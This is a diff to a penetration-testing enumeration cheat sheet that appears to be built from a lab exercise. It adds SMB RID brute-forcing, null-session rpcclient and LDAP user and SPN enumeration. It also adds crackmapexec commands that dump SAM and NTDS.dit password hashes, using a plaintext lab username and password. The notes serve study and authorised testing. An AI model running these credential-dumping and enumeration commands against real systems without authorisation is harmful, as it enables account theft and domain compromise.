@@ -24,6 +24,11 @@ Phase Order:
   Passive Recon → Host Discovery → Port Scan → Service ID → Deep Enum per Service → Vuln ID
 ```
 
+> [!warning]
+>**`export`** <u>only applies to current session</u>
+>
+>See with **`echo $DOMAIN`**
+
 ```bash
 # Always set target variables at the start of every engagement
 export TARGET="10.10.10.5"
@@ -383,6 +388,12 @@ crackmapexec smb $TARGET
 crackmapexec smb $TARGET -u username -p password --shares
 ```
 
+```Bash
+crackmapexec smb $TARGET -u 'guest' -p '' --rid-brute
+
+crackmapexec smb $TARGET -u 'anonymous' -p '' --rid-brute
+```
+
 ```bash
 # Enumerate logged-on users
 crackmapexec smb $TARGET -u username -p password --loggedon-users
@@ -398,7 +409,53 @@ crackmapexec smb 10.10.10.0/24 -u username -p password
 crackmapexec smb $TARGET -u username -H NTHASH --shares
 ```
 
+> [!warning] <u>With **crackmapexec** and **nxc**</u> <u>**BUT SMBCLIENT CAN WORK**</u>
+>**If nmap shows smb2/smb3 : Message signing enabled and required and NOT using smb1, the NULL and Anon/Guest sessions will fail.**
+
+To understand why, you have to distinguish between the **Protocol** (the language) and the **Authentication Policy** (the rules).
+
+#### 1. SMBv1 vs. SMBv3
+
+- **SMBv1:** This protocol was "insecure by design." It allowed a lot of information leakage (like listing users and shares) before you even proved who you were.
+    
+- **SMBv3:** This is the modern standard. It is designed to be "secure by default." While SMBv3 _can_ technically support null sessions if an administrator explicitly enables them, it is almost never the case on a modern Windows Server (2016/2019/2022).
+
+#### 2. Null vs. Anonymous: The Subtle Difference
+
+In the world of Windows security, these are often used interchangeably, but there's a technical nuance:
+
+- **Null Session:** Connecting with **Username: `""`** and **Password: `""`**.
+    
+- **Anonymous Session:** Connecting with **Username: `"Anonymous"`** or **`"Guest"`** and **Password: `""`**.
+
+>**If you see SMBv3 and "Signing Required" in Nmap, the "Null Session" (completely empty) is almost certainly dead. However, the Guest account is sometimes left enabled on specific shares (like a "Public" or "Transfer" share) even on SMBv3.**
+
+#### If you have creds :
+##### Dumping Local Hashes (SAM)
+
+If **t-skid** has **local administrative privileges** on the machine, you can dump the **SAM** database. This contains the NTLM hashes of local users (like the local `Administrator`).
+
+```Bash
+crackmapexec smb 10.114.175.102 -u 't-skid' -p 'tj072889*' --sam
+```
+
+##### Dumping Domain Hashes (NTDS.dit) (**DCSYNC**)
+
+If **t-skid** is a **Domain Admin** (or has `DS-Replication-Get-Changes` rights), you can perform a **DRSUTAPI** dump. This pulls the NTLM hashes for **every user in the domain** from the Active Directory database (`NTDS.dit`).
+
+```Bash
+crackmapexec smb 10.114.175.102 -u 't-skid' -p 'tj072889*' --ntds
+```
+
+> **Note:** This is the "Nuclear Option." If it works, you have compromised every account in the network.
+
 ### 6.4 Enum4linux / Enum4linux-ng
+
+```bash
+# Users RID brute
+enum4linux -r -u 'guest' $TARGET
+enum4linux -r -u 'anonymous' $TARGET
+```
 
 ```bash
 # Full SMB/RPC enumeration — users, groups, shares, password policy, OS
@@ -637,10 +694,37 @@ nmap -sU -p 161 --script=snmp-info,snmp-processes,snmp-win32-users $TARGET
 rpcinfo -p $TARGET
 ```
 
+> [!warning]
+>- `rpcinfo` sends a request to the <u>Portmapper</u> (typically <u>port 111</u>).
+>    
+>- If port 111 is filtered, `rpcinfo` will wait for a long timeout period before giving up.
+>    
+>- Looking at your Nmap results, **port 111 is not in your list of open ports.**
+
 ```bash
 # Enumerate RPC via Nmap
 nmap -p 111 --script=rpcinfo $TARGET
 ```
+
+### 11.2 RPCCLIENT
+#### Use `rpcclient`
+
+Since port 135 is confirmed open in your scan, use `rpcclient` to start an interactive session. This is much more powerful for Active Directory enumeration.
+
+```Bash
+# Connect with a null session (no username/password)
+rpcclient -U "" -N 10.114.180.108
+```
+
+Once you get the `rpcclient $>` prompt, you can run commands like:
+
+- `srvinfo` (Server information)
+    
+- `enumdomusers` (List all users)
+    
+- `querydominfo` (Domain information)
+    
+- `netshareenumall` (List all shares)
 
 ### 11.2 NFS
 
@@ -829,11 +913,6 @@ dig NS $DOMAIN
 > Key ports: 389 (LDAP), 636 (LDAPS), 3268/3269 (Global Catalog)
 
 ```bash
-# Test for anonymous LDAP bind — common misconfiguration
-ldapsearch -x -H ldap://$TARGET -b "" -s base
-```
-
-```bash
 # Pull naming contexts — reveals domain structure without creds
 ldapsearch -x -H ldap://$TARGET -s base namingcontexts
 ```
@@ -843,6 +922,47 @@ ldapsearch -x -H ldap://$TARGET -s base namingcontexts
 ldapsearch -x -H ldap://$TARGET -b "DC=corp,DC=local" "(objectClass=*)"
 ```
 
+```Bash
+# Extract the Domain Password Policy
+ldapsearch -x -H ldap://$DC_IP -b "DC=vulnnet-rst,DC=local" "(objectClass=domain)" pwdProperties pwdHistoryLength minPwdLength lockoutThreshold
+```
+
+```Bash
+# Enumerate ALL Domain Users
+ldapsearch -x -H ldap://$DC_IP:3268 -b "DC=vulnnet-rst,DC=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName
+```
+
+```bash
+# Find "Description" Field Leaks
+ldapsearch -x -H ldap://$DC_IP -b "DC=vulnnet-rst,DC=local" "(objectClass=user)" description
+```
+
+```bash
+# Map the "Service Principal Names" (SPNs)
+ldapsearch -x -H ldap://$DC_IP -b "DC=vulnnet-rst,DC=local" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName
+```
+#### Automated Tooling Recommendation
+
+Instead of running manual `ldapsearch` commands, use a tool that parses this into a readable format:
+
+##### **`windapsearch`**: A specialized tool for this exact scenario :
+
+```bash
+# Enumerate Domain Users (The -U flag)
+python3 windapsearch.py --dc-ip $DC_IP -d vulnnet-rst.local -U
+  
+# Enumerate Kerberoastable Domain Users
+python3 windapsearch.py --dc-ip $DC_IP -d vulnnet-rst.local --user-spns
+```
+
+##### `nxc` (NetExec) :
+
+```bash
+nxc ldap $DC_IP -u '' -p '' --users
+nxc ldap $DC_IP -u '' -p '' --pass-pol
+```
+
+##### Other commands :
 ```bash
 # Enumerate users with credentials
 ldapsearch -x -H ldap://$TARGET -D "CN=user,DC=corp,DC=local" -w password \
